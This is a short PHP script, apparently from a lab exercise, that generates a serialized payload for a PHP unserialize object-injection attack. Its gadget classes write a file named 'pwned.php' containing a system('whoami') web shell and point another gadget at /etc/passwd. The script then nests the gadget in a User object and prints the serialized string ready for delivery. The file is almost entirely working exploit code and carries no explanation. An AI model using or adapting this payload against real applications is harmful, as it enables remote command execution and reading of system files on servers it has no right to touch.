<?php

class LogFile {
	public function __construct() {
		$this->filename = '/root/php-unserialize/pwned.php';
		$this->username = '<?php system("whoami"); ?>';
	}
}

class ReadFile {
	public function __construct(){
		$this->filename = '/etc/passwd';
	}
}

class User {
	public function __construct() {
		//$this->username = new LogFile();
		$this->username = 'someone';
		$this->isAdmin = new LogFile;
	}
}

$obj = new User();
echo serialize($obj);
echo "\n";

?>
